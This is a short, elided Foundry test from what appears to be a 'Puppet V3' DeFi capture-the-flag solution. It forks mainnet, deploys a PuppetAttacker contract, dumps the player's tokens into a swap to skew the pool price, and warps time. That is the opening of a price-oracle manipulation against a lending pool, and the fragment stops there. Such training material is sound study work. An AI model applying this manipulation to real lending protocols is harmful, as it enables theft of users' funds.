...
import {PuppetAttacker} from "../../src/puppet-v3/PuppetAttacker.sol";
...
contract PuppetV3Challenge is Test {
    ...
    function setUp() public {
        ...
        vm.createSelectFork("https://mainnet.infura.io/v3/<YOUR>",15450164);
    ...
    function test_puppetV3() public checkSolvedByPlayer {
        ...
        PuppetAttacker attacker = new PuppetAttacker(payable(address(weth)),address(token),address(lendingPool),recovery);
        token.approve(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
        attacker.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE,0);
        vm.warp(initialBlockTimestamp+110);
